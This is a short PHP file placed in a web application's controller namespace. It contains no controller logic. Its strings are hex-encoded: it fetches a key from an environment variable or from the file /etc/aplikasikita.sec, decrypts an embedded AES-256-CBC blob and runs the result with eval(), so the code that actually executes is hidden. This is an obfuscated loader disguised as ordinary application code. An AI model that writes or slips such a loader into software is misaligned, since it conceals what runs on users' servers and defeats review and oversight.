<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('CXQFknIOnBudhiHFlpLL9Q==');

$c=base64_decode(

'OgIcBNUA0ZanC3IyY4x6p3eYAMwOGfoGY7BjOCbVjsTuKdCjXUd1tdrwB/p0muB9XTYb8uwsP6oL' .
'BFV1Ip2tRdydtia18qhA8Y0TfI4yGd+5kTrSGHLHh5D6JO6n0lbWcivpePuAjx3Si9/D7qFA96yb' .
'DkCXPE7RDnq2tRWGj8T6dnaL1OlGmfPqstBq52RVVZl7rKvGT1RCXTguuGErjidMpDtXaPcLZA73' .
'IBcjUiLEH0IIv+SVphJreI9+tjKc'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

